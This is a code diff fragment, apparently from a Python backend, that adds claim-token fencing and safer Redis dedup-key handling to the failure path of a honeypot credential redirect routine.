+            # INTR-002: on failure, ALSO clear the sweep-side claim
+            # by writing redirected_at=None, redirect_claimed_at=None so the next sweep can retry.
             update_payload = {
                 "redirected_at": None,
+                "redirect_claimed_at": None,
                 "redirect_error": str(resp.get("description") or resp.get("error", "unknown"))[:200],
                 "sender_user_id": user_id,
             }
-        await async_execute(
+        query = (
             db.table("honeypot_updates")
             .update(update_payload)
             .eq("id", update_id)
+            .eq("redirect_claimed_at", claim_token)
         )
+        update_res = await async_execute(query)
+        if not update_res.data:
+            logger.warning(
+                f"🔀 [Redirect] Fenced out post-send: claim_token {claim_token} expired or overwritten on row {update_id}"
+            )
+            return {"status": "fenced_out", "credential_id": credential_id}
     except Exception as _swallowed:
         logger.debug(f"[suppressed] {_swallowed}")
 
-    # BUG-5 FIX: Only set dedup key on successful delivery
-    if sent_ok:
-        try:
-            from app.core.redis_srv import redis_srv
-            redis_srv.client.set(f"redirect:sent:{credential_id}:{user_id}", "1")
-        except Exception as _swallowed:
-            logger.debug(f"[suppressed] {_swallowed}")
+    # BUG-5 FIX: Set permanent dedup key on success, or safely release claiming reservation on failure
+    try:
+        from app.core.redis_srv import redis_srv
+        if sent_ok:
+            redis_srv.client.set(dedup_key, "1")
+        else:
+            _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
+    except Exception as _swallowed:
+        logger.debug(f"[suppressed] {_swallowed}")
 
     if sent_ok:
         logger.info(
